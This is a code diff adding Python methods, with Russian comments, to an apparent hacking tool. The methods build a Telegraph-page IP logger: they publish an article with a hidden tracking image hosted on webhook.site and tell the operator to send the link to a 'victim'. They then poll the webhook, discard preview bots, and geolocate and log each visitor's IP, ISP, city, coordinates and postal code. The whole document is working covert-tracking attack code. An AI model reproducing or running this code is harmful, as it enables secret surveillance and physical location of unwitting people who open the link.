@@ -1,0 +1,483 @@
+def create_telegraph_logger(self):
+        """Создание Telegraph статьи с IP логгером и автоматический мониторинг"""
+        pystyle.Write.Print(
+            "\n[*] Создание Telegraph статьи с IP логгером...\n", 
+            pystyle.Colors.cyan_to_blue, 
+            interval=0.005
+        )
+        
+        # Ввод данных для статьи
+        title = pystyle.Write.Input(
+            "[?] Введите заголовок статьи: ", 
+            pystyle.Colors.green, 
+            interval=0.001
+        )
+        
+        author = pystyle.Write.Input(
+            "[?] Введите имя автора (по умолчанию Anonymous): ", 
+            pystyle.Colors.green, 
+            interval=0.001
+        ) or "Anonymous"
+        
+        description = pystyle.Write.Input(
+            "[?] Введите описание/текст статьи: ", 
+            pystyle.Colors.green, 
+            interval=0.001
+        )
+        
+        webhook_check_url = None
+        webhook_url = None
+        
+        try:
+            # Создаем временный webhook на webhook.site
+            pystyle.Write.Print(
+                "\n[*] Создание временного webhook...", 
+                pystyle.Colors.yellow, 
+                interval=0.005
+            )
+            webhook_response = requests.post("https://webhook.site/token", timeout=10)
+            webhook_data = webhook_response.json()
+            webhook_url = f"https://webhook.site/{webhook_data['uuid']}"
+            webhook_check_url = f"https://webhook.site/token/{webhook_data['uuid']}/requests"
+            
+            pystyle.Write.Print(
+                f"[+] Создан временный webhook\n", 
+                pystyle.Colors.green, 
+                interval=0.005
+            )
+            
+            # Сначала создаем аккаунт Telegraph
+            pystyle.Write.Print(
+                "[*] Создание Telegraph аккаунта...", 
+                pystyle.Colors.yellow, 
+                interval=0.005
+            )
+            
+            account_response = requests.post(
+                "https://api.telegra.ph/createAccount",
+                json={
+                    "short_name": author,
+                    "author_name": author
+                },
+                timeout=10
+            )
+            account_data = account_response.json()
+            
+            if not account_data.get("ok"):
+                pystyle.Write.Print(
+                    f"\n[!] Ошибка создания аккаунта: {account_data.get('error', 'Неизвестная ошибка')}\n", 
+                    pystyle.Colors.red_to_yellow, 
+                    interval=0.005
+                )
+                return
+            
+            access_token = account_data["result"]["access_token"]
+            
+            pystyle.Write.Print(
+                "[*] Создание Telegraph страницы...", 
+                pystyle.Colors.yellow, 
+                interval=0.005
+            )
+            
+            # Создаем контент с IP логгером
+            content = [
+                {
+                    "tag": "p",
+                    "children": [description]
+                },
+                {
+                    "tag": "img",
+                    "attrs": {
+                        "src": f"{webhook_url}?logger=ip&t={{timestamp}}"
+                    }
+                }
+            ]
+            
+            # Создание страницы
+            page_response = requests.post(
+                "https://api.telegra.ph/createPage",
+                json={
+                    "access_token": access_token,
+                    "title": title,
+                    "author_name": author,
+                    "content": content,
+                    "return_content": False
+                },
+                timeout=10
+            )
+            
+            page_data = page_response.json()
+            
+            if page_data.get("ok"):
+                page_url = f"https://telegra.ph/{page_data['result']['path']}"
+                
+                pystyle.Write.Print(
+                    f"\n[✓] Telegraph статья успешно создана!\n", 
+                    pystyle.Colors.green, 
+                    interval=0.005
+                )
+                
+                pystyle.Write.Print(
+                    f"[+] URL статьи:", 
+                    pystyle.Colors.green, 
+                    interval=0.005
+                )
+                pystyle.Write.Print(
+                    f"    {page_url}\n", 
+                    pystyle.Colors.white, 
+                    interval=0.005
+                )
+                
+                # Сохранение информации в файл
+                filename = f"telegraph_logger_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+                
+                with open(filename, "w", encoding="utf-8") as f:
+                    f.write("=" * 60 + "\n")
+                    f.write("TELEGRAPH IP LOGGER\n")
+                    f.write("=" * 60 + "\n\n")
+                    f.write(f"Заголовок: {title}\n")
+                    f.write(f"Автор: {author}\n")
+                    f.write(f"Описание: {description}\n\n")
+                    f.write(f"URL статьи: {page_url}\n")
+                    f.write(f"Webhook URL: {webhook_url}\n")
+                    f.write(f"Проверка логов: {webhook_check_url}\n")
+                    f.write(f"Access Token: {access_token}\n")
+                    f.write(f"\nСоздано: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                
+                pystyle.Write.Print(
+                    f"[+] Информация сохранена в файл:", 
+                    pystyle.Colors.green, 
+                    interval=0.005
+                )
+                pystyle.Write.Print(
+                    f"    {filename}\n", 
+                    pystyle.Colors.white, 
+                    interval=0.005
+                )
+                
+                # Инструкция
+                pystyle.Write.Print(
+                    "\n[i] Отправьте ссылку жертве:", 
+                    pystyle.Colors.cyan_to_blue, 
+                    interval=0.005
+                )
+                pystyle.Write.Print(
+                    f"    {page_url}\n", 
+                    pystyle.Colors.white, 
+                    interval=0.005
+                )
+                
+                pystyle.Write.Print(
+                    "[*] Запуск автоматического мониторинга...\n", 
+                    pystyle.Colors.yellow, 
+                    interval=0.005
+                )
+                
+                time.sleep(2)
+                
+                # Автоматически запускаем мониторинг
+                self.monitor_webhook_logs(webhook_check_url, webhook_url, page_url)
+                
+            else:
+                pystyle.Write.Print(
+                    f"\n[!] Ошибка создания статьи: {page_data.get('error', 'Неизвестная ошибка')}\n", 
+                    pystyle.Colors.red_to_yellow, 
+                    interval=0.005
+                )
+                
+        except Exception as e:
+            pystyle.Write.Print(
+                f"\n[!] Ошибка: {str(e)}\n", 
+                pystyle.Colors.red_to_yellow, 
+                interval=0.005
+            )
+
+    def monitor_webhook_logs(self, webhook_check_url, webhook_url, page_url=None):
+        """Мониторинг логов webhook в реальном времени"""
+        self.clear_screen()
+        self.show_banner()
+        
+        pystyle.Write.Print(
+            "\n╔═══════════════════════════════════════════════════════════╗", 
+            pystyle.Colors.cyan_to_blue, 
+            interval=0.001
+        )
+        pystyle.Write.Print(
+            "║           МОНИТОРИНГ ЛОГОВ В РЕАЛЬНОМ ВРЕМЕНИ           ║", 
+            pystyle.Colors.cyan_to_blue, 
+            interval=0.001
+        )
+        pystyle.Write.Print(
+            "╚═══════════════════════════════════════════════════════════╝\n", 
+            pystyle.Colors.cyan_to_blue, 
+            interval=0.001
+        )
+        
+        if page_url:
+            pystyle.Write.Print(
+                f"[+] URL статьи: {page_url}", 
+                pystyle.Colors.green, 
+                interval=0.005
+            )
+        pystyle.Write.Print(
+            f"[+] Webhook URL: {webhook_url}", 
+            pystyle.Colors.green, 
+            interval=0.005
+        )
+        pystyle.Write.Print(
+            "\n[*] Мониторинг запущен... (Нажмите Ctrl+C для остановки)\n", 
+            pystyle.Colors.yellow, 
+            interval=0.005
+        )
+        
+        seen_requests = set()
+        request_count = 0
+        
+        # Список ботов для фильтрации
+        bot_keywords = [
+            'bot', 'crawler', 'spider', 'telegram', 'discord', 
+            'whatsapp', 'facebook', 'twitter', 'slack', 'skype',
+            'preview', 'link', 'embed', 'meta', 'scraper'
+        ]
+        
+        try:
+            while True:
+                try:
+                    # Получаем логи с webhook.site
+                    response = requests.get(webhook_check_url, timeout=10)
+                    
+                    if response.status_code == 200:
+                        data = response.json()
+                        requests_data = data.get("data", [])
+                        
+                        for req in requests_data:
+                            req_id = req.get("uuid")
+                            
+                            if req_id and req_id not in seen_requests:
+                                seen_requests.add(req_id)
+                                
+                                # Извлекаем информацию
+                                created_at = req.get("created_at", "N/A")
+                                ip_address = req.get("ip", "N/A")
+                                user_agent = req.get("user_agent", "N/A")
+                                method = req.get("method", "N/A")
+                                
+                                # Фильтруем ботов (без вывода сообщения)
+                                is_bot = any(keyword.lower() in user_agent.lower() for keyword in bot_keywords)
+                                
+                                if is_bot:
+                                    continue
+                                
+                                request_count += 1
+                                
+                                # Получаем дополнительную информацию об IP
+                                ip_info = self.get_ip_info_silent(ip_address)
+                                
+                                # Красивый вывод
+                                pystyle.Write.Print(
+                                    f"\n{'='*70}", 
+                                    pystyle.Colors.cyan_to_blue, 
+                                    interval=0.001
+                                )
+                                pystyle.Write.Print(
+                                    f"[!] НОВЫЙ ВИЗИТ #{request_count}", 
+                                    pystyle.Colors.red_to_yellow, 
+                                    interval=0.005
+                                )
+                                pystyle.Write.Print(
+                                    f"{'='*70}\n", 
+                                    pystyle.Colors.cyan_to_blue, 
+                                    interval=0.001
+                                )
+                                
+                                # Время
+                                pystyle.Write.Print(
+                                    f"[+] Время визита:", 
+                                    pystyle.Colors.green, 
+                                    interval=0.005
+                                )
+                                pystyle.Write.Print(
+                                    f"    {created_at}\n", 
+                                    pystyle.Colors.white, 
+                                    interval=0.005
+                                )
+                                
+                                # IP адрес
+                                pystyle.Write.Print(
+                                    f"[+] IP адрес:", 
+                                    pystyle.Colors.green, 
+                                    interval=0.005
+                                )
+                                pystyle.Write.Print(
+                                    f"    {ip_address}\n", 
+                                    pystyle.Colors.white, 
+                                    interval=0.005
+                                )
+                                
+                                if ip_info:
+                                    # Страна
+                                    pystyle.Write.Print(
+                                        f"[+] Страна:", 
+                                        pystyle.Colors.green, 
+                                        interval=0.005
+                                    )
+                                    pystyle.Write.Print(
+                                        f"    {ip_info.get('country', 'N/A')}\n", 
+                                        pystyle.Colors.white, 
+                                        interval=0.005
+                                    )
+                                    
+                                    # Регион
+                                    pystyle.Write.Print(
+                                        f"[+] Регион:", 
+                                        pystyle.Colors.green, 
+                                        interval=0.005
+                                    )
+                                    pystyle.Write.Print(
+                                        f"    {ip_info.get('regionName', 'N/A')}\n", 
+                                        pystyle.Colors.white, 
+                                        interval=0.005
+                                    )
+                                    
+                                    # Город
+                                    pystyle.Write.Print(
+                                        f"[+] Город:", 
+                                        pystyle.Colors.green, 
+                                        interval=0.005
+                                    )
+                                    pystyle.Write.Print(
+                                        f"    {ip_info.get('city', 'N/A')}\n", 
+                                        pystyle.Colors.white, 
+                                        interval=0.005
+                                    )
+                                    
+                                    # Временная зона
+                                    pystyle.Write.Print(
+                                        f"[+] Временная зона:", 
+                                        pystyle.Colors.green, 
+                                        interval=0.005
+                                    )
+                                    pystyle.Write.Print(
+                                        f"    {ip_info.get('timezone', 'N/A')}\n", 
+                                        pystyle.Colors.white, 
+                                        interval=0.005
+                                    )
+                                    
+                                    # ISP
+                                    pystyle.Write.Print(
+                                        f"[+] Провайдер (ISP):", 
+                                        pystyle.Colors.green, 
+                                        interval=0.005
+                                    )
+                                    pystyle.Write.Print(
+                                        f"    {ip_info.get('isp', 'N/A')}\n", 
+                                        pystyle.Colors.white, 
+                                        interval=0.005
+                                    )
+                                    
+                                    # Организация
+                                    pystyle.Write.Print(
+                                        f"[+] Организация:", 
+                                        pystyle.Colors.green, 
+                                        interval=0.005
+                                    )
+                                    pystyle.Write.Print(
+                                        f"    {ip_info.get('org', 'N/A')}\n", 
+                                        pystyle.Colors.white, 
+                                        interval=0.005
+                                    )
+                                    
+                                    # Координаты
+                                    pystyle.Write.Print(
+                                        f"[+] Координаты:", 
+                                        pystyle.Colors.green, 
+                                        interval=0.005
+                                    )
+                                    pystyle.Write.Print(
+                                        f"    Широта: {ip_info.get('lat', 'N/A')}, Долгота: {ip_info.get('lon', 'N/A')}\n", 
+                                        pystyle.Colors.white, 
+                                        interval=0.005
+                                    )
+                                    
+                                    # Почтовый индекс
+                                    if ip_info.get('zip'):
+                                        pystyle.Write.Print(
+                                            f"[+] Почтовый индекс:", 
+                                            pystyle.Colors.green, 
+                                            interval=0.005
+                                        )
+                                        pystyle.Write.Print(
+                                            f"    {ip_info.get('zip', 'N/A')}\n", 
+                                            pystyle.Colors.white, 
+                                            interval=0.005
+                                        )
+                                
+                                # User-Agent
+                                pystyle.Write.Print(
+                                    f"[+] User-Agent:", 
+                                    pystyle.Colors.green, 
+                                    interval=0.005
+                                )
+                                pystyle.Write.Print(
+                                    f"    {user_agent}\n", 
+                                    pystyle.Colors.white, 
+                                    interval=0.005
+                                )
+                                
+                                # Метод
+                                pystyle.Write.Print(
+                                    f"[+] HTTP Метод:", 
+                                    pystyle.Colors.green, 
+                                    interval=0.005
+                                )
+                                pystyle.Write.Print(
+                                    f"    {method}\n", 
+                                    pystyle.Colors.white, 
+                                    interval=0.005
+                                )
+                                
+                                # Сохраняем в файл
+                                log_filename = f"ip_logs_{datetime.now().strftime('%Y%m%d')}.txt"
+                                with open(log_filename, "a", encoding="utf-8") as f:
+                                    f.write(f"\n{'='*70}\n")
+                                    f.write(f"ВИЗИТ #{request_count}\n")
+                                    f.write(f"{'='*70}\n")
+                                    f.write(f"Время визита:        {created_at}\n")
+                                    f.write(f"IP адрес:            {ip_address}\n")
+                                    if ip_info:
+                                        f.write(f"Страна:              {ip_info.get('country', 'N/A')}\n")
+                                        f.write(f"Регион:              {ip_info.get('regionName', 'N/A')}\n")
+                                        f.write(f"Город:               {ip_info.get('city', 'N/A')}\n")
+                                        f.write(f"Временная зона:      {ip_info.get('timezone', 'N/A')}\n")
+                                        f.write(f"Провайдер (ISP):     {ip_info.get('isp', 'N/A')}\n")
+                                        f.write(f"Организация:         {ip_info.get('org', 'N/A')}\n")
+                                        f.write(f"Координаты:          Широта: {ip_info.get('lat', 'N/A')}, Долгота: {ip_info.get('lon', 'N/A')}\n")
+                                        if ip_info.get('zip'):
+                                            f.write(f"Почтовый индекс:     {ip_info.get('zip', 'N/A')}\n")
+                                    f.write(f"User-Agent:          {user_agent}\n")
+                                    f.write(f"HTTP Метод:          {method}\n")
+                                
+                                pystyle.Write.Print(
+                                    f"\n[✓] Лог сохранен в {log_filename}\n", 
+                                    pystyle.Colors.green, 
+                                    interval=0.005
+                                )
+                    
+                    # Ждем 5 секунд перед следующей проверкой
+                    time.sleep(5)
+                    
+                except requests.exceptions.RequestException:
+                    pystyle.Write.Print(
+                        "[!] Ошибка подключения к webhook, повтор через 10 сек...", 
+                        pystyle.Colors.red_to_yellow, 
+                        interval=0.005
+                    )
+                    time.sleep(10)
+                    
+        except KeyboardInterrupt:
+            pystyle.Write.Print(
+                f"\n\n[*] Мониторинг остановлен. Всего визитов: {request_count}\n", 
+                pystyle.Colors.yellow, 
+                interval=0.005
+            )
+    
